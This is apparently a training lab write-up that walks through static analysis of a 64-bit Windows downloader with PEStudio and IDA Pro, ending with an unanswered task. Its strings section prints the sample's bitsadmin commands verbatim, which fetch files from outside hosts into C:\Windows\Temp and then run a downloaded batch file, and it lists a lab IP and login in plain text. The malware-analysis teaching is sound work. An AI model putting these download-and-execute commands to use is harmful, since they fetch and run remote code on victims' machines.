# Lab 12 - Reverse Engineering a 64-bit Downloader using IDA Pro

- [Lab 12 - Reverse Engineering a 64-bit Downloader using IDA Pro](#lab-12---reverse-engineering-a-64-bit-downloader-using-ida-pro)
  - [Scenario](#scenario)
  - [Tools](#tools)
  - [Task 1: General Sample Info](#task-1-general-sample-info)
  - [Task 2: Locating Main Function](#task-2-locating-main-function)
  - [Task 3: Reverse Engineering Main Function](#task-3-reverse-engineering-main-function)
  - [Task 4: Checking other functions](#task-4-checking-other-functions)

---

## Scenario

You have been called by a client to examine a weird sample that was found on one of their developer’s systems. The client thinks this sample could be hiding its true nature of activity.

<br/>

The goal of this lab is to understand how to both debug and reverse engineer a downloader which is widely used by different threat actors.

<br/>

After completing this lab, you will be able to use a disassembler such as IDA Pro to reverse engineer a downloader. You will also use a debugger such as x64dbg to debug the same downloader and understand what malicious activity is being carried by this downloader.

<br/>

192.168.210.10 / AdminELS / Nu3pmkfyX

<br/>

---

## Tools

- x64dbg (or any other 64-bit debugger) 
- IDA Pro (we are using the free version) 
- pestudio (9.0.2) or any other PE Analyzer

<br/>

---

## Task 1: General Sample Info

**Question**

Use a PE file analyzer to extract as much information you can to help you with the reverse engineering process.

<br/>

**Answer**

Open **Downloader.exe** in **PEStudio**:

![picture 369](images/dd32dd2ae2ac9dd1696b15cbe69e9c2e54442c0adcd6d0f14dc64930ee23c0cc.png)  

- MD5: 0F57C9201984E46D8AEFE1113828D645
- SHA1: EA26217E97B1024311E3359C85EDDBEDDC603682
- SHA256: F1E6E24655960818A1CBAFF3641AC5CB22FF26ED0EB86986B68CEB10C1F611A4
- PE file (`MZ` / `0x4d5a`)
- 64-bit
- Console application

<br/>

Navigate to **Libraries**:

![picture 370](images/5389c234ca76a54c2bdfe27c15740e5d0626b7689f411222d085797993208ad7.png)  

- urlmon.dll - network connectivity (`URLDownloadToFileA`)
- kernel32.dll
- shell32.dll

<br/>

Check **imports**:

![picture 371](images/6b0e5fad68ac6e0e9381f1ef9ad4c4ead38d7105adbc6ae10f95ff6934ff7d66.png)  

- URLDownloadToFileA
- ShellExecuteA

<br/>

Check **manifest**:

![picture 372](images/f840587975b16c5555c9ee09b45f687f5de5698e92aa31ed4dc511a526b04c5a.png)  

- The program requires Administrator privilege

<br/>

Check **Strings**:

![picture 373](images/0abea42d36b9fb52a6276a82c5cda3600de7636c0b6fb51c2ff5626ef39cc8f0.png)  

- (0x1420) `/C bitsadmin.exe /transfer IND1 /download /priority high https://download.sysinternals.com/files/ShellRunas.zip C:\Windows\Temp\1.zip`
- (0x14A8) `cmd.exe`
- (0x14B8) `c:\Windows\Temp\`
- (0x14D0) `/C tar.exe -xf C:\Windows\Temp\1.zip && del /F c:\Windows\Temp\1.zip`
- (0x1518) `2.zip`
- (0x1520) `https://download.sysinternals.com/files/Autoruns.zip`
- (0x1560) `/C tar.exe -xf C:\Windows\Temp\2.zip && del /F c:\Windows\Temp\2.zip`
- (0x15B0) `/C bitsadmin.exe /transfer IND2 /download /priority high http://www.elsmap.com/file.bat C:\Windows\Temp\file.bat`
- (0x1628) `/C C:\Windows\Temp\file.bat && del /F c:\Windows\Temp\file.bat`

<br/>

---

## Task 2: Locating Main Function

**Question**

Use a disassembler and try to locate where is the main function of this sample.

<br/>

**Answer**

Run **IDA Pro 64-bit** as admin and load the sample:

![picture 374](images/024d903f3992c0c7f3926cddaf0f53eab63acdbaa86e0bc84801e2cb208901ea.png)  

- Leave all as default

![picture 375](images/3a536cbbfe77e6897b442b84e02cdaf942ff73bab64086b40b05e38ec9ef16db.png)  

- IDA will place you at the function that it believes based on its analysis is the start of this program. 
- Note even though we write some code in C/C++ and it starts with `main()` function, this is not the first thing that will be executed, there are many other things that get loaded and executed before main, many as IDA consider that “start”

<br/>

First go to the **Imports** tab:

![picture 376](images/44fc185fb10808c5fe0ff76d957eef3144f0c3b844a80fa2acd03cb6dbedfbfa.png)  

- Many unimportant libraries - MS C's runtime libraries

<br/>

To filter, right-click inside the import tab and click `Modify filters` (`Ctrl + Shift + F`):

![picture 377](images/48bf31afa829f98feb10638a8a8b2282ce2407c07b2833ae653ccb41484bbc7a.png)  

<br/>

Add filter:

- `If column Library contains api- then exclude`
- `If column Library contains VCRUNTIME then exclude`

![picture 379](images/29d6f4314e761c6d031223f4620b3563732f30e981b37d68c111448f3ae9f764.png)  

![picture 380](images/b6ad4766bc7c67f5898f51e0d2e7c059a82f2c0e44b664858ec69b8c1558f766.png)  


<br/>

Then navigate to `View > Open subviews > Strings` (`Shift + F12`):

![picture 381](images/3e930fc82211f5bbbc1659c54671e3fddd3dedd2441f36cdf57cf22a268f76df.png)  

- Same when doing Static Analysis

<br/>

In the **Function Window** on the left, double click `start`:

![picture 382](images/8470f35334b48cb8988001b3fc98fada700af56d8588b69a585fda31c2636843.png)  

- 2 function calls: `__security_init_cookie` and `?__scrt_common_mai_seh@@YAHXZ`

<br/>

Double click `__security_init_cookie`, which brings us to the function:

![picture 383](images/ddbbd8b53ba7caf360364b963b20d189f137f992b95499c8ffa63aa3c9f4d1ea.png)  


- Reference: http://uninformed.org/index.cgi?v=7&a=2&p=5
- Added by the Microsoft Visual Studio Compiler
- Generate the cookie that will be placed in the stack frame of a function call
- It is added at the beginning of the executable to protect the whole executable, so it is actually being called before the entry-point of the program, which we see in different PE analyzers is being called

Note:
You can rename the functoin by selecting the name of the function and then press `N`

<br/>

Move on to `?__scrt_common_mai_seh@@YAHXZ`:

![picture 384](images/2e96ae43ec3eeae9933f1eb659fd8d3c7959d4a8ccc661c4740a54316d994e55.png)  

<br/>

Also we can see in the **Graph Overview Window** at the bottom left - this gives you an idea of what this function flow looks like.

![picture 385](images/e2942562fa2e330ea7ba449faeca6a063dde03798ee280336fd022e904e59fcd.png)  

<br/>

Locate the main function by the keyword `_get initial_narrow_environment`:

![picture 386](images/d64dc3b46e0a1cb3319f817fb73b280a11dcafbfe7bcec4e314a931a976bd606.png)  

![picture 388](images/9803d23f2bb266ed0e76c7a56b699205c013f4c381d4df25f4f4c415d6a2a5ef.png)  


- These are the arguments passed to the main function `int main(int argc, char *argv[], char *envp[])`
- `r8` holds the value of `*envp[]`
- `rdx` holds the value of `*argv[]`
- `ecx` holds the value of `argc`
- `main` is a call to `main`

<br/>

Double click `main`, it shows the assembly of the main function.

![picture 389](images/7c874627e6173ff5071ea220b14a0e273aed88674dd1db073c70acd8f9f3f78d.png)  


<br/>

---

## Task 3: Reverse Engineering Main Function

**Question**

Reverse engineer the sample to understand what it is doing. Document all the function calls used and how they are being used. Use MSDN for referencing and understanding the functions you find.

<br/>

**Answer**

First note the **Graph Overview**:

![picture 390](images/551e70eaec51bb10f6a2c7d23e8fca12dedfc8193513eada8e24000e31a38ea6.png)  

<br/>

Look at the first block:

![picture 391](images/62756adc9447d2c841b265b570396ea3f026c1cd9758951cb917c4f65675d8c4.png)  

- The **functoin prologue** (Stack Frame Preparation)
- A number of parameters passed
- A call to a Windows API called `ShellExecuteA`, which is used to perform a specific operatin on a file (e.g. open a file)

```C++
HINSTANCE ShellExecuteA(
  HWND   hwnd,
  LPCSTR lpOperation,
  LPCSTR lpFile,
  LPCSTR lpParameters,
  LPCSTR lpDirectory,
  INT    nShowCmd
);
```

<br/>

From the code and the details of `ShellExecuteA`:

- `r9 > Parameters > /C bitsadmin.exe /transfer ...`
- `[rsp+38h+nShowCmd] > ebx > 0`
- `r8 > File > cmd.exe`
- `rds > Operation > Open`
- `[rsp+38h+lpDirectory] > rbx > lpDirectory > 0`
- `ecx > 0 > hwnd`

<br/>
Note:
Note the first 4 parameters of a function in a 64-bit program are passed by the registers `rcx`, `rdx`, `r8` and `r9` respectively, and everything else is **on the stack**. Which means:
- `rcx` holds the **handle** --> `hwnd`
- `rdx` holds the **lpOperation** --> `open`
- `r8` holds the **lpFile** --> `cmd.exe`
- `r9` holds the `lpParameters` --> Parameters
- Everything else on the `stack` --> `lpDirectory` which is 0 and `nShowCmd` which is also 0

<br/>

We can also double click on the **label Parameters** and it takes you to the details.

<br/>

---

## Task 4: Checking other functions

**Question**

There are functions that are unneeded or unnecessary related directly to the what this sample is doing. Try to identify some of them and try to explain why we find them in native C++ code.

<br/>

**Answer**



<br/>
